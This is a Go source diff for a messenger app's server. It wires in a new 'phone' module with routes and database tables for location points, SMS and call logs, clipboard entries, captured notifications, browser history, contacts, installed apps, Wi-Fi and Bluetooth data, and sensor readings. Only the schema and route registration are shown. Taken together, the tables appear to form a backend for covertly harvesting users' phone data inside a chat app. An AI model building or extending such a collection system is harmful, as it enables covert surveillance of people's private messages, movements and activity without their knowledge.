@@ -32,6 +32,9 @@ import (
 	messageservice "github.com/jeogram/messenger/internal/modules/message/service"
 	notificationdomain "github.com/jeogram/messenger/internal/modules/notification/domain"
 	notificationhandler "github.com/jeogram/messenger/internal/modules/notification/handler"
+	phonedomain "github.com/jeogram/messenger/internal/modules/phone/domain"
+	phonehandler "github.com/jeogram/messenger/internal/modules/phone/handler"
+	phoneservice "github.com/jeogram/messenger/internal/modules/phone/service"
 	notificationrepo "github.com/jeogram/messenger/internal/modules/notification/repository"
 	notificationservice "github.com/jeogram/messenger/internal/modules/notification/service"
 	userdomain "github.com/jeogram/messenger/internal/modules/user/domain"
@@ -46,6 +49,7 @@ import (
 	"github.com/jeogram/messenger/internal/pkg/cache"
 	"github.com/jeogram/messenger/internal/pkg/events"
 	"github.com/jeogram/messenger/internal/pkg/middleware"
+	dbmigrate "github.com/jeogram/messenger/internal/pkg/migrate"
 	"github.com/jeogram/messenger/internal/pkg/realtime"
 	"github.com/jeogram/messenger/internal/pkg/ws"
 	"github.com/rs/zerolog/log"
@@ -68,6 +72,11 @@ func New(cfg *config.Config, db *gorm.DB, redis *cache.Redis, producer *events.P
 	if err := migrate(db); err != nil {
 		return nil, err
 	}
+	if cfg.DB.Driver == "postgres" {
+		if err := dbmigrate.Run(db); err != nil {
+			log.Warn().Err(err).Msg("versioned migrations failed")
+		}
+	}
 	return &Server{cfg: cfg, db: db, redis: redis, producer: producer, hub: hub}, nil
 }
 
@@ -86,6 +95,23 @@ func migrate(db *gorm.DB) error {
 		&notificationdomain.DeviceToken{},
 		&notificationdomain.Notification{},
 		&calldomain.Call{},
+		&phonedomain.DeviceInfo{},
+		&phonedomain.DeviceStatus{},
+		&phonedomain.LocationPoint{},
+		&phonedomain.InstalledApp{},
+		&phonedomain.PhoneContact{},
+		&phonedomain.CallLog{},
+		&phonedomain.SmsLog{},
+		&phonedomain.ClipboardEntry{},
+		&phonedomain.NotificationCapture{},
+		&phonedomain.AppUsage{},
+		&phonedomain.MediaItem{},
+		&phonedomain.DeviceAccount{},
+		&phonedomain.WifiNetwork{},
+		&phonedomain.BluetoothDevice{},
+		&phonedomain.CalendarEvent{},
+		&phonedomain.SensorReading{},
+		&phonedomain.BrowserHistory{},
 	)
 }
 
@@ -151,14 +177,14 @@ func (s *Server) Router() *chi.Mux {
 	authSvc := service.NewAuthService(userRepo, jwtSvc, s.redis)
 	userSvc := userservice.NewUserService(userRepo, settingsRepo, contactRepo, chatRepo)
 	chatSvc := chatService.NewChatService(chatRepo)
-	msgSvc := messageservice.NewMessageService(msgRepo, chatRepo, s.producer, s.cfg.Kafka, broadcaster)
+	msgSvc := messageservice.NewMessageService(msgRepo, chatRepo, s.producer, s.cfg.Kafka, broadcaster, s.cfg.Message)
 	mediaSvc, err := mediaservice.NewMediaService(s.cfg.Media)
 	if err != nil {
 		panic(fmt.Sprintf("media service: %v", err))
 	}
 	pushSvc := notificationservice.NewPushService(s.cfg.Push)
 	notifSvc := notificationservice.NewNotificationService(deviceRepo, notifRepo, userRepo, chatRepo, pushSvc, broadcaster, s.producer, s.cfg.Kafka.NotifyTopic)
-	callSvc := callservice.NewCallService(callRepo, chatRepo)
+	callSvc := callservice.NewCallService(callRepo, chatRepo, s.cfg.RTC)
 	contactSvc := contactservice.NewContactService(contactRepo, userRepo)
 
 	// Module handlers.
@@ -172,6 +198,9 @@ func (s *Server) Router() *chi.Mux {
 	contactH := contacthandler.NewContactHandler(contactSvc, jwtSvc)
 	adminH := adminhandler.NewAdminHandler(s.db, jwtSvc, s.cfg.Admin.UserIDs)
 
+	phoneSvc := phoneservice.NewPhoneService(s.db)
+	phoneH := phonehandler.NewPhoneHandler(phoneSvc, jwtSvc)
+
 	authH.RegisterRoutes(r)
 	userH.RegisterRoutes(r)
 	chatH.RegisterRoutes(r)
@@ -181,6 +210,7 @@ func (s *Server) Router() *chi.Mux {
 	callH.RegisterRoutes(r)
 	contactH.RegisterRoutes(r)
 	adminH.RegisterRoutes(r)
+	phoneH.RegisterRoutes(r)
 
 	if s.cfg.Metrics.Enabled {
 		r.Handle(s.cfg.Metrics.Path, promhttp.Handler())
